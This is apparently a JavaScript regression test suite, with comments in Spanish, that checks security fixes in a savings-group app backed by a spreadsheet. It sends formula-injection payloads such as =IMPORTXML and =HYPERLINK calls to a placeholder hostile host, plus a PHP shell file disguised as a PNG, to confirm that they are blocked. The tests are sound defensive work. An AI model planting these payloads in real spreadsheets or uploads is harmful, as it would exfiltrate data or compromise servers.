/**
 * SUITE 23 - Que no la tumben ni la usen para otra cosa.
 *
 * Sale de una auditoria de ataques que midio, con peticiones reales:
 *   - 200 intentos de entrada seguidos, ninguno frenado, y el mensaje decia si
 *     el correo existia o no: se podia averiguar quien tiene cuenta probando
 *     correos.
 *   - Varios campos se escribian CRUDOS en la hoja de calculo. Como la hoja es
 *     la base de datos, un socio podia meter =IMPORTXML(...) y, al abrirla un
 *     directivo, la formula se ejecutaba y mandaba los datos del grupo a donde
 *     el atacante quisiera.
 *   - Las respuestas de error devolvian el stack completo con las rutas del
 *     servidor y el numero de proyecto de Google.
 *   - Sin X-Frame-Options la app se podia enmarcar en una pagina ajena.
 *
 * Tambien se comprueba que un grupo dado de baja deja de admitir movimientos:
 * al pasar el borrado a baja logica se quedo operativo por dentro.
 */

const { hoyLocal, PNG_PRUEBA, seedWorkbook, get, post, api, postArchivo, fake } = require('./harness');
const { baseScenario, seedUser, login } = require('./scenario');
const t = require('./runner');

const FORMULAS = ['=1+1', '=IMPORTXML("http://malo/","//x")', '+1+1', '-1+1', '@SUM(A1:A9)',
  '=HYPERLINK("http://malo","pincha")'];

/** Una celda esta a salvo si no empieza por un caracter que Sheets interprete. */
const aSalvo = (v) => !/^\s*[=+\-@]/.test((v == null ? '' : v).toString());

module.exports = async function run() {
  seedWorkbook();
  const G_SHEETS = require('../governance').SHEETS;
  Object.values(G_SHEETS).forEach((def) => fake.seedSheet(def.name, [def.headers]));
  const { HOJA, CABECERA } = require('../accesos');
  fake.seedSheet(HOJA, [CABECERA]);

  const e = await baseScenario({ groupId: 'GEND' });
  const G = 'GEND';
  const hoy = hoyLocal();

  // ===================================================================
  t.section('END 1. El login no dice quien tiene cuenta');
  // ===================================================================
  const noExiste = await post('/api/login', { email: 'nadie@ninguna.test', password: 'loquesea' });
  const claveMala = await post('/api/login', { email: e.users.socio1.email, password: 'noEsLaSuya' });
  t.status('un correo que no existe da 401', noExiste, 401);
  t.status('y una clave incorrecta tambien', claveMala, 401);
  t.eq('con EL MISMO mensaje, para no revelar quien esta registrado',
    noExiste.body?.message, claveMala.body?.message);
  t.check('y el mensaje no menciona al usuario ni a la contrasena por separado',
    !/no encontrado|no existe/i.test(noExiste.body?.message || ''),
    noExiste.body?.message);

  // ===================================================================
  t.section('END 2. Los intentos de entrada tienen freno');
  // ===================================================================
  // Con una cuenta propia: el freno es real y dura 15 minutos, asi que quemar
  // los intentos de un usuario compartido dejaria sin entrar a las baterias que
  // vienen despues.
  const cebo = seedUser({ nombre: 'Cuenta de prueba del freno', email: 'freno@juntago.test' });
  let frenado = null;
  for (let i = 0; i < 12; i += 1) {
    const r = await post('/api/login', { email: cebo.email, password: 'mala' });
    if (r.status === 429) { frenado = { intento: i + 1, cuerpo: r.body }; break; }
  }
  t.check('a los pocos intentos fallidos se frena', !!frenado,
    'se hicieron 12 intentos sin que ninguno fuera frenado');
  if (frenado) {
    t.check('se dice cuanto hay que esperar', frenado.cuerpo?.reintentarEn > 0,
      JSON.stringify(frenado.cuerpo));
    t.check('y el mensaje lo explica', /intentos/i.test(frenado.cuerpo?.message || ''),
      frenado.cuerpo?.message);
  }

  // Quien tiene la clave buena sigue entrando: el freno es por cuenta, no global
  t.status('otra persona con su clave correcta entra igual',
    await post('/api/login', { email: e.users.presi.email, password: 'Clave123' }), 200);

  // ===================================================================
  t.section('END 3. Ninguna formula entra en la hoja');
  // ===================================================================
  for (const formula of FORMULAS) {
    await post('/api/registrar-transaccion-en-sheet', {
      TransactionID: formula, Type: formula, Amount: 1, Description: formula,
      Date: formula, Category: formula, Icon: formula,
    }, e.tokens.socio1);
  }
  const trans = (fake.dumpSheet('Transactions') || []).slice(1);
  const sucias = trans.filter((f) => f.some((c) => !aSalvo(c)));
  t.eq('ninguna celda de una transaccion queda como formula', sucias.length, 0,
    JSON.stringify(sucias.slice(0, 2)));

  await post('/api/registrar-ahorros',
    { groupId: G, date: '=1+1', amount: 10 }, e.tokens.socio1);
  await post('/api/registrar-acciones',
    { groupId: G, date: '=IMPORTXML("http://malo","//x")', shares: 1 }, e.tokens.socio1);
  await post('/api/registrar-solicitud',
    { tipo: 'prestamo', data: { ID: '=1+1', Monto: 10, Detalles: '=1+1', Fecha: '@SUM(A1)', Group: G } },
    e.tokens.socio1);

  for (const hoja of ['Savings', 'Acciones', 'SolicitudesPrestamos']) {
    const filas = (fake.dumpSheet(hoja) || []).slice(1);
    const malas = filas.filter((f) => f.some((c) => !aSalvo(c)));
    t.eq(`ni en ${hoja}`, malas.length, 0, JSON.stringify(malas.slice(0, 2)));
  }

  // ===================================================================
  t.section('END 4. Los errores no cuentan como esta hecho el servidor');
  // ===================================================================
  const respuestas = [
    await get('/api/obtener-prestamos?groupId=NO_EXISTE&userEmail=x@y.test', e.tokens.socio1),
    await post('/api/registrar-solicitud', { tipo: 'inventado', data: {} }, e.tokens.socio1),
    await get('/api/gob/asambleas/NO_EXISTE', e.tokens.socio1),
  ];
  for (const r of respuestas) {
    const texto = JSON.stringify(r.body || {});
    t.check('la respuesta no trae un stack', !/\bat .+:\d+:\d+/.test(texto), texto.slice(0, 150));
    t.check('ni rutas del servidor', !/[A-Za-z]:\\\\|\/node_modules\//.test(texto), texto.slice(0, 150));
  }
  t.check('ni el numero de proyecto de Google',
    !respuestas.some((r) => /project_number|private_key/i.test(JSON.stringify(r.body || ''))), '');

  // ===================================================================
  t.section('END 5. Cabeceras que impiden enmarcar la app');
  // ===================================================================
  const ping = await api('GET', '/api/ping', { raw: true });
  t.status('el ping responde', ping, 200);
  // Las cabeceras se comprueban con fetch directo, que si las expone
  const cab = await fetch(`${require('./harness').BASE}/api/ping`);
  t.eq('no se puede enmarcar la app en otra pagina',
    (cab.headers.get('x-frame-options') || '').toUpperCase(), 'DENY');
  t.eq('el navegador no adivina tipos de contenido',
    cab.headers.get('x-content-type-options'), 'nosniff');
  t.check('hay politica de contenido',
    /frame-ancestors/.test(cab.headers.get('content-security-policy') || ''),
    cab.headers.get('content-security-policy'));
  t.eq('y no se anuncia con que esta hecho', cab.headers.get('x-powered-by'), null);

  // ===================================================================
  t.section('END 6. Un grupo dado de baja no admite movimientos');
  // ===================================================================
  // El borrado paso a ser baja logica para no dejar el dinero huerfano, pero el
  // grupo se quedo operativo por dentro: se seguian metiendo ahorros y pidiendo
  // prestamos en una caja cerrada.
  t.status('el admin da de baja el grupo',
    await api('DELETE', `/api/eliminar-grupo/${G}`, { token: e.tokens.admin }), 200);

  t.status('ya no se registran ahorros',
    await post('/api/registrar-ahorros', { groupId: G, date: hoy, amount: 10 }, e.tokens.socio1), 409);
  t.status('ni se compran acciones',
    await post('/api/registrar-acciones', { groupId: G, date: hoy, shares: 1 }, e.tokens.socio1), 409);
  t.status('ni se piden prestamos',
    await post('/api/registrar-solicitud',
      { tipo: 'prestamo', data: { Monto: 10, Detalles: 'Plazo: 3', Group: G } }, e.tokens.socio1), 409);
  t.status('ni se convocan asambleas',
    await post('/api/gob/asambleas',
      { groupId: G, titulo: 'X', fechaProgramada: hoy }, e.tokens.presi), 409);
  t.status('ni se cambia el reglamento',
    await post('/api/gob/reglas', { groupId: G, aporteMinimo: 1 }, e.tokens.presi), 409);

  t.check('y el grupo desaparece de la lista del socio',
    !((await get(`/api/grupos-del-usuario?email=${e.users.socio1.email}`, e.tokens.socio1))
      .body?.grupos || []).some((x) => x.groupId === G),
    'el grupo dado de baja sigue en la lista');

  t.check('pero sus movimientos siguen en la hoja, para el historial',
    (fake.dumpSheet('Savings') || []).slice(1).some((r) => (r[1] || '') === G),
    'se perdieron los movimientos del grupo');

  // ===================================================================
  t.section('END 7. Dar de baja a alguien le quita el token en el acto');
  // ===================================================================
  // El rol y el estado salian del JWT, que dura 30 dias y no se puede revocar.
  // Medido: una socia dada de baja siguio registrando ahorros en la caja del
  // grupo con su token viejo, y un administrador degradado a socio conservo el
  // poder de listar a todo el mundo con sus datos personales y de desactivar
  // cuentas ajenas. Ahora el estado y el rol se leen de la hoja en cada
  // peticion.
  seedWorkbook();
  Object.values(G_SHEETS).forEach((def) => fake.seedSheet(def.name, [def.headers]));
  fake.seedSheet(HOJA, [CABECERA]);
  require('../hoja').invalidarTodo();

  const f = await baseScenario({ groupId: 'GTOK' });
  const tokenViejo = f.tokens.socio1;

  t.status('con la cuenta activa entra a su panel',
    await get('/api/mi-perfil', tokenViejo), 200);

  t.status('el admin la da de baja',
    await post('/api/desactivar-usuario', { Email: f.users.socio1.email }, f.tokens.admin), 200);
  require('../hoja').invalidarTodo();

  t.status('su token viejo YA NO sirve para ver su perfil',
    await get('/api/mi-perfil', tokenViejo), 401);
  t.status('ni para registrar un ahorro en la caja del grupo',
    await post('/api/registrar-ahorros',
      { groupId: 'GTOK', date: hoy, amount: 5 }, tokenViejo), 401);
  t.eq('y no quedo ninguna fila suya en la hoja',
    (fake.dumpSheet('Savings') || []).slice(1)
      .filter((r) => (r[0] || '') === f.users.socio1.email && (r[1] || '') === 'GTOK').length, 0);

  t.status('al reactivarla vuelve a entrar con el mismo token',
    await post('/api/activar-usuario', { Email: f.users.socio1.email }, f.tokens.admin), 200);
  require('../hoja').invalidarTodo();
  t.status('y su panel responde otra vez', await get('/api/mi-perfil', tokenViejo), 200);

  // ===================================================================
  t.section('END 8. Quitar el rol de administrador surte efecto');
  // ===================================================================
  const segundo = seedUser({ nombre: 'Admin Dos', email: 'admin2@juntago.test', role: 'admin' });
  const tokenAdmin2 = await login(segundo.email);
  require('../hoja').invalidarTodo();

  t.status('con rol de admin lista a todos los usuarios',
    await get('/api/obtener-usuarios', tokenAdmin2), 200);

  t.status('el otro admin lo degrada a socio',
    await post('/api/cambiar-rol-usuario',
      { Email: segundo.email, Role: 'member' }, f.tokens.admin), 200);
  require('../hoja').invalidarTodo();

  t.status('su token viejo ya no lista usuarios',
    await get('/api/obtener-usuarios', tokenAdmin2), 403);
  t.status('ni desactiva a nadie',
    await post('/api/desactivar-usuario',
      { Email: f.users.socio2.email }, tokenAdmin2), 403);
  t.status('pero sigue entrando a su propio perfil, que es lo suyo',
    await get('/api/mi-perfil', tokenAdmin2), 200);

  // ===================================================================
  t.section('END 9. Una sola cuenta no deja sin servicio a las demas');
  // ===================================================================
  // El freno de lecturas era UN cubo para todo el proceso: una persona
  // recargando pantallas pesadas agotaba la cuota y las socias de OTROS grupos
  // recibian 429. Ahora cada cuenta tiene ademas su propio tope.
  const hojaMod = require('../hoja');
  const config = hojaMod.configurar({});
  try {
    hojaMod.invalidarTodo();
    hojaMod.configurar({ ttlMs: 0, maxPorMinuto: 500, maxPorCuenta: 3, esperaMaxMs: 200 });

    const respuestas = [];
    for (let i = 0; i < 6; i += 1) {
      respuestas.push(await get(`/api/gob/tablero?groupId=GTOK`, f.tokens.presi));
    }
    t.check('a la cuenta que abusa se le frena',
      respuestas.some((r) => r.status === 429),
      JSON.stringify(respuestas.map((r) => r.status)));

    const victima = await get('/api/mi-perfil', f.tokens.socio2);
    t.status('pero otra socia sigue entrando con normalidad', victima, 200);
  } finally {
    hojaMod.configurar(config);
    hojaMod.invalidarTodo();
  }

  // ===================================================================
  t.section('END 10. Las dos celdas que se escribian crudas');
  // ===================================================================
  // La bateria de formulas probaba `registrar-transaccion` pero mandaba
  // Amount: 1, y no probaba `agregar-aporte`. Los dos campos se escribian sin
  // escapar y quedaban como formula viva en la hoja.
  seedWorkbook();
  Object.values(G_SHEETS).forEach((def) => fake.seedSheet(def.name, [def.headers]));
  fake.seedSheet(HOJA, [CABECERA]);
  hojaMod.invalidarTodo();
  const h = await baseScenario({ groupId: 'GFOR' });

  await post('/api/registrar-transaccion-en-sheet', {
    TransactionID: 'TXF', Type: 'ingreso', Amount: '=HYPERLINK("http://malo","x")',
    Description: 'ok', Date: hoy, Category: 'c', Icon: 'i',
  }, h.tokens.socio1);
  const tx = (fake.dumpSheet('Transactions') || []).slice(1);
  t.check('el importe de una transaccion no queda como formula',
    aSalvo((tx[tx.length - 1] || [])[3]), JSON.stringify(tx[tx.length - 1]));

  await post('/api/agregar-aporte',
    { GroupID: 'GFOR', Email: h.users.socio1.email, Monto: 5, Fecha: '=1+1' }, h.tokens.socio1);
  const ap = (fake.dumpSheet('Aportes') || []).slice(1);
  t.check('ni la fecha de un aporte',
    aSalvo((ap[ap.length - 1] || [])[3]), JSON.stringify(ap[ap.length - 1]));

  // ===================================================================
  t.section('END 11. El comprobante tiene que ser una imagen de verdad');
  // ===================================================================
  // El filtro miraba el tipo que DECLARA el navegador: un shell.php enviado
  // como image/png pasaba. Ahora se miran los primeros bytes del archivo.
  fake.ensureSheet('Loans').grid.push([
    'LN_IMG', h.users.socio1.email, 'GFOR', 300, hoy,
    new Date().toISOString(), 2, 'aprobado', 3, 318,
  ]);
  const falsa = await postArchivo('/api/upload-payment',
    { loanId: 'LN_IMG', amount: 10, paymentDate: hoy, description: 'x' },
    { campo: 'paymentImage', nombre: 'shell.php', contenido: '<?php echo 1; ?>', tipo: 'image/png' },
    h.tokens.socio1);
  t.status('un archivo que no es imagen se rechaza con 415', falsa, 415);
  t.check('y el mensaje se entiende',
    /no es una foto|imagen/i.test(falsa.body?.message || ''), falsa.body?.message);

  const buena = await postArchivo('/api/upload-payment',
    { loanId: 'LN_IMG', amount: 10, paymentDate: hoy, description: 'x' },
    { campo: 'paymentImage', nombre: 'c.png', contenido: PNG_PRUEBA, tipo: 'image/png' },
    h.tokens.socio1);
  t.statusIn('una foto de verdad si entra', buena, [200, 201]);

  // ===================================================================
  t.section('END 13. El cargo de quien esta de baja no vale');
  // ===================================================================
  // `getUserGroupRole` devolvia el cargo de la fila del vinculo SIN mirar la
  // columna de Estado. Medido: se marca a la presidenta como 'baja' en la hoja y
  // seguia cambiando el reglamento (HTTP 200) y convocando asambleas (HTTP 201)
  // del grupo del que ya no formaba parte.
  seedWorkbook();
  Object.values(G_SHEETS).forEach((def) => fake.seedSheet(def.name, [def.headers]));
  fake.seedSheet(HOJA, [CABECERA]);
  hojaMod.invalidarTodo();
  const n2 = await baseScenario({ groupId: 'GROL' });

  t.status('con el cargo vivo, la presidencia cambia el reglamento',
    await post('/api/gob/reglas', { groupId: 'GROL', aporteMinimo: 5 }, n2.tokens.presi), 200);

  fake.ensureSheet('UserGroupLinks').grid.forEach((r) => {
    if ((r[0] || '') === n2.users.presi.email && (r[1] || '') === 'GROL') r[4] = 'baja';
  });
  hojaMod.invalidarTodo();

  t.status('dada de baja, ya no cambia el reglamento',
    await post('/api/gob/reglas', { groupId: 'GROL', aporteMinimo: 9 }, n2.tokens.presi), 403);
  t.status('ni convoca asambleas',
    await post('/api/gob/asambleas',
      { groupId: 'GROL', titulo: 'X', fechaProgramada: hoy, modalidad: 'presencial' },
      n2.tokens.presi), 403);
  t.status('ni resuelve aportes de la caja',
    await post('/api/gob/aportes/resolver',
      { groupId: 'GROL', tipo: 'ahorro', movId: 'loquesea', accion: 'confirmar' },
      n2.tokens.presi), 403);

  t.near('y el reglamento se quedo como estaba antes de la baja',
    Number(((await get('/api/gob/reglas?groupId=GROL', n2.tokens.teso)).body?.reglas || {}).aporteMinimo),
    5, 0.01);

  // ===================================================================
  t.section('END 12. Nadie se aprueba a si mismo el comprobante');
  // ===================================================================
  // El endpoint leia el campo `status` DEL CUERPO y lo escribia tal cual en la
  // hoja. Medido: una socia subio su comprobante con status=approved y su deuda
  // bajo de $336 a $186 sin que la tesoreria mirara nada; y encima el
  // comprobante no salia en la bandeja, asi que nadie se enteraba.
  seedWorkbook();
  Object.values(G_SHEETS).forEach((def) => fake.seedSheet(def.name, [def.headers]));
  fake.seedSheet(HOJA, [CABECERA]);
  hojaMod.invalidarTodo();
  const m = await baseScenario({ groupId: 'GAPR' });
  fake.ensureSheet('Loans').grid.push([
    'LN_APR', m.users.socio1.email, 'GAPR', 300, hoy,
    new Date().toISOString(), 2, 'aprobado', 6, 336,
  ]);

  const saldoDe = async () => Number(((await get(
    `/api/obtener-prestamos?groupId=GAPR&userEmail=${m.users.socio1.email}`,
    m.tokens.socio1)).body?.loans || [])[0]?.remainingBalance);
  const saldoAntes = await saldoDe();
  t.near('el prestamo debe 336', saldoAntes, 336, 0.01);

  const conTrampa = await postArchivo('/api/upload-payment',
    { loanId: 'LN_APR', amount: 150, paymentDate: hoy, description: 'mi pago', status: 'approved' },
    { campo: 'paymentImage', nombre: 'c.png', contenido: PNG_PRUEBA, tipo: 'image/png' },
    m.tokens.socio1);
  t.statusIn('el comprobante se sube', conTrampa, [200, 201]);

  const filaPago = (fake.dumpSheet('LoanPayments') || []).slice(1)
    .find((r) => (r[2] || '') === 'LN_APR');
  t.eq('pero nace POR REVISAR, aunque pidiera aprobado',
    (filaPago?.[6] || '').toString().toLowerCase(), 'pending_approval');
  t.near('y su deuda no baja ni un centavo', await saldoDe(), 336, 0.01);

  const bandeja = await get('/api/pending-payments?groupId=GAPR', m.tokens.teso);
  t.check('sale en la bandeja de la tesoreria, para que alguien lo mire',
    (bandeja.body?.payments || []).some((x) => (x.loanId || '') === 'LN_APR'),
    JSON.stringify(bandeja.body?.payments || []).slice(0, 200));

  // Un comprobante escrito a mano en la hoja, con la casilla de estado vacia,
  // tampoco puede quedarse atrapado
  fake.ensureSheet('LoanPayments').grid.push([
    'PAGO_EN_BLANCO', m.users.socio2.email, 'LN_APR', 20, hoy, 'a mano', '',
    '', '', '', '', new Date().toISOString(), '', '', '',
  ]);
  hojaMod.invalidarTodo();
  const bandeja2 = await get('/api/pending-payments?groupId=GAPR', m.tokens.teso);
  t.check('un comprobante con la casilla de estado en blanco tambien sale',
    (bandeja2.body?.payments || []).some((x) => (x.paymentId || '') === 'PAGO_EN_BLANCO'),
    JSON.stringify((bandeja2.body?.payments || []).map((x) => x.paymentId)));

  t.status('y la tesoreria si puede aprobarlo, que es lo suyo',
    await post('/api/approve-payment',
      { paymentId: 'PAGO_EN_BLANCO', action: 'approve' }, m.tokens.teso), 200);
};
